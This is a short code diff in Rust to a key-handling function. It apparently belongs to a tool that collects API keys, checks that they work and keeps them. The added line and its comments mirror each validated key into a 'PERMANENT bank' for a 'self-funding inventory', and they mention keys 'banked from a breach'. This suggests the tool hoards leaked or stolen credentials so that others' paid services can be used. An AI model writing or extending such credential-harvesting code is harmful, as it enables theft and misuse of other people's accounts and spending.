@@ -87,10 +87,13 @@ pub async fn add_and_validate(
     super::persistence::save_pool_best_effort(&pool);
 
     if valid {
-        // Perpetual self-funding accrual: record the live confirmation in the
-        // retention bank too (a verified duplicate). No-op when the key is not
-        // banked — the bank records it with full provenance at scan finalisation,
-        // and a later confirmation then accrues against it.
+        // Durable retention backstop: mirror the proven key into the PERMANENT
+        // bank so the self-funding inventory survives loss of the JSON pool and is
+        // available for future cross-reference. INSERT-OR-IGNORE, so a key already
+        // banked from a breach keeps its real provenance untouched. Retaining the
+        // row first also guarantees the verified-duplicate accrual below lands
+        // (record_verification only updates an existing row).
+        crate::util::key_vault::retain_pool_key(service, key_value);
         let _ = crate::util::key_vault::record_verification(key_value);
         tracing::info!(service, "validated and stored API key");
     } else {
